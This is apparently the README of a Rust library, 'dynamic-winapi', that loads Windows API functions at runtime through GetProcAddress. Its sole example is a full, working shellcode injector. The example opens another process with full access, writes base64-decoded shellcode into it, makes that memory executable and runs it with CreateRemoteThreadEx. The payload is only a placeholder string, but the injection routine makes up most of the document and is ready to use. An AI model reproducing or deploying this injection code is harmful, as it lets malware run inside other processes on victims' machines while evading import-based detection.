# dynamic-winapi

Provide raw FFI bindings to the Windows API by dynamically loading DLLs and resolving the functions with [GetProcAddress](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress).

This project is not a replacement for the [winapi-rs](https://github.com/retep998/winapi-rs) crate and you will more than likely require it if you use this project.

## Example
```Rust
use dynamic_winapi::um::{
    processthreadsapi::{CreateRemoteThreadEx, OpenProcess},
    memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory},
};
use winapi::um::winnt::{
    MEM_COMMIT, PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_ALL_ACCESS,
};

fn main() {
    // insert target PID
    let pid = 5100;
    // insert base64 encoded shellcode
    let shellcode_b64 = "<insert-valid-base64>";
    let mut shellcode = base64::decode(shellcode_b64).unwrap();
    let shellcode_ptr: *mut c_void = shellcode.as_mut_ptr() as *mut c_void; 

    // get process handle
    let handle = unsafe {OpenProcess().unwrap()(
        PROCESS_ALL_ACCESS,
        0x01,
        pid
    )};

    // alloc payload
    let addr_shellcode = unsafe {VirtualAllocEx().unwrap()(
        handle,
        0 as _,
        shellcode.len(),
        MEM_COMMIT,
        PAGE_READWRITE
    )};
    let mut ret_len: usize = 0;
    let _ = unsafe {WriteProcessMemory().unwrap()(
        handle,
        addr_shellcode,
        shellcode_ptr,
        shellcode.len(),
        &mut ret_len
    )};

    // protect and execute
    let mut old_protect: u32 = 0;
    let _ = unsafe {VirtualProtectEx().unwrap()(
        handle,
        addr_shellcode,
        shellcode.len(),
        PAGE_EXECUTE_READ,
        &mut old_protect
    )};
    let _ = unsafe {CreateRemoteThreadEx().unwrap()(
        handle,
        0 as _,
        0,
        std::mem::transmute(addr_shellcode),
        0 as _,
        0,
        0 as _,
        0 as _
    )};
}
```

## Feedback

Feel free to file an issue or make a request for APIs [here](https://github.com/postrequest/dynamic-winapi/issues/new).

## Acknowledgments
[@retep998](https://github.com/retep998) for [winapi-rs](https://github.com/retep998/winapi-rs). This project would not have been possible without this, so if you use `dynamic-winapi` or [winapi-rs](https://github.com/retep998/winapi-rs), please consider supporting [@retep998](https://github.com/retep998) [here](https://patreon.com/retep998).  
